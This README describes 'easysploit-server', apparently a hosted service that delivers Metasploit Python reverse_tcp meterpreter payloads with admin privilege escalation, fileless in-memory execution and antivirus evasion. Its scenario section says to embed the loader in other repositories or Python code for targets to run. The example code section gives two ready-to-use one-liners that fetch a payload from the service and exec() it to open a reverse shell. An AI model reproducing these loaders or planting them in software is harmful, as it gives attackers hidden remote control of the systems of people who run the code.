# easysploit-server
## Overview
Easysploit Server is a tool designed to generate, customize, and manage Metasploit reverse_tcp payloads. It simplifies exploitation with built-in admin privilege escalation, and AV evasion capabilities, supporting fileless execution for fast, undetectable operations.
Easysploit server is now working on https://easysploit.rocknroll17.com.

## Features
- Custom Reverse_TCP Payloads
- Admin Privilege Escalation
- Fileless Execution (Memory-based)
- Anti-Virus Evasion

## Scenario
1. **Generate Exploit Code using easysploit-client**  
Use easysploit-client to generate the exploit code. The generated code requests a payload from easysploit-server and executes it in a fileless manner.
2. **Embed the Exploit Code**  
Insert the generated code into other repositories or Python code to be executed on the target system.
3. **Execute on Target System**  
When the code is executed on the target system, it sends a request to easysploit-server for the payload.
4. **Fileless Execution**  
The easysploit-server delivers the payload and executes it filelessly in memory without leaving traces on the disk.

## Installation
You don't need to run this server.
It is already working on https://easysploit.rocknroll17.com.

## Usage
### Available Endpoints
1. **Standard python Reverse TCP Payload**
Endpoint: `/python/meterpreter/reverse_tcp`
2. **Admin Privilege Reverse TCP Payload**
Endpoint: `/python/meterpreter/reverse_tcp/admin`
  
You can try these request in https://easysploit.rocknroll17.com/docs

### Request Body
Both endpoints require the same JSON payload:
```
{
  "LHOST": "Attacker's IP",
  "LPORT": Attacker's listening port
}
```

## Example Code
Insert this code where you gonna exploit.
1. **Standard python Reverse TCP Payload**
```
import urllib.request, json
exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
```
2. **Admin Privilege Reverse TCP Payload**
```
import urllib.request, json
exec(urllib.request.urlopen(urllib.request.Request("https://easysploit.rocknroll17.com/python/meterpreter/reverse_tcp/admin", data=json.dumps({"LHOST": "Attacker's IP", "LPORT": Attacker's listening port}).encode(), headers={'Content-Type': 'application/json'})).read().decode())
```
